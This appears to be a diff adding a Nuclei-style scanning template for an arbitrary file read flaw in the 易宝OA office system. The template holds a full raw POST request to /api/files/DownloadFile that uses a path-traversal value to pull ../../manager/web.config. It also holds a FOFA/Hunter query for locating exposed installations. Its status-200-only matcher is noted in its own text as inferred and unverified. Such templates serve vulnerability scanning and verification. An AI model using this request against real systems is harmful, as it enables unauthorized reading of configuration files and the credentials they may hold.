@@ -1,0 +1,36 @@
+id: poc-07a7c009711b919cd3f2
+info:
+  name: 易宝OAdownloadfile任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/07a7c009711b919cd3f2e9b3a3de3b34
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 07a7c009711b919cd3f2e9b3a3de3b34
+    fofa: + hunter`web.title="欢迎登录易宝OA系统"||banner="易宝OA"`
+http:
+- raw:
+  - 'POST /api/files/DownloadFile HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0
+
+    Connection: close
+
+    Content-Length: 94
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    token=zxh&requestFileName=../../manager/web.config&pathType=1&startPosition=0&bufferSize=1000'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
